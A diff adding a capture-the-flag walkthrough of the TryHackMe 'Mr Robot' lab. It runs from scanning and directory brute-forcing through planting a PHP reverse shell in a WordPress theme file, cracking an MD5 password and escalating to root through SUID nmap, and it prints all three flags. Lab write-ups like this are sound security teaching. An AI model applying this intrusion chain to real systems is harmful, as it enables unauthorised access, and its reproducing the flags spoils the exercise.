@@ -1,0 +1,172 @@
+root@natzsec:~/Desktop/tryhackme/boxes/mr_robot_ctf# nmap -sC -sV -oA nmap/initial 10.10.246.146
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 05:39 IST
+Nmap scan report for 10.10.246.146
+Host is up (0.24s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.55 seconds
+
+Nmap shows port 80 and 443 are opened.
+
+When checked on the port 80 it runs a terminal window with all the options so we can select any one of them.
+
+We checked each and every one of them but was not intresting apart from the source code.
+
+Gobuster shows us the below results :
+
+root@natzsec:~/Desktop/tryhackme/boxes/mr_robot_ctf# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.246.146/ -x "php,txt,asp,jsp,jpg" -t 30
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.246.146/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     jpg,php,txt,asp,jsp
+[+] Timeout:        10s
+===============================================================
+2020/05/11 05:44:49 Starting gobuster
+===============================================================
+/sitemap (Status: 200)
+/blog (Status: 301)
+/images (Status: 301)
+/index.php (Status: 301)
+/rss (Status: 301)
+/login (Status: 302)
+/video (Status: 301)
+/0 (Status: 301)
+/feed (Status: 301)
+/image (Status: 301)
+/atom (Status: 301)
+/wp-content (Status: 301)
+/admin (Status: 301)
+/audio (Status: 301)
+/intro (Status: 200)
+/wp-login (Status: 200)
+/wp-login.php (Status: 200)
+/css (Status: 301)
+/rss2 (Status: 301)
+
+
+If we can check the robots.txt it shows the below contents :
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+Key 1: 073403c8a58a1f80d943455fb30724b9
+
+if we visit the page http://mrrobot.thm/license
+
+We get a base64 encoded string.
+
+ZWxsaW90OkVSMjgtMDY1Mgo=
+
+root@natzsec:~/Desktop/tryhackme/boxes/mr_robot_ctf# echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
+elliot:ER28-0652
+
+Seems like we have the username and password.
+
+After login into the Wordpress we can goto Appearance > Editor > 404.php 
+
+Add our reverse php shell which we can get from pentestmonkey.
+
+Start the listner. Once you visit the url http://mrrobot.thm/wp-content/404.php
+
+Your reverse shell will be executed and you will recieve a reverse shell at your listner.
+
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/$ hostname
+hostname
+linux
+daemon@linux:/$ ls -la /home
+ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+daemon@linux:/$ cd robot
+cd robot
+bash: cd: robot: No such file or directory
+daemon@linux:/$ cd /home/robot
+cd /home/robot
+daemon@linux:/home/robot$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ su robot 
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ 
+
+If we take a look at the /home folder there is a folder as robot it is a user as well, you will find the password.raw-md5 which will have the password for robot in md5 format.
+
+Cracking that md5 resulted in the password : abcdefghijklmnopqrstuvwxyz
+
+do su robot and enter the passoword.
+
+Grab the flag now.
+
+For root privielege we ran the linpeas.sh
+
+Found that the nmap is having the SUID 
+
+# ls -la /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+# 
+
+And going to gtfobins we can see that the nmap can be rin in an interactive mode and we can spawn a shell.
+
+robot@linux:/tmp$ nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# cd /root
+# ls -la
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# 
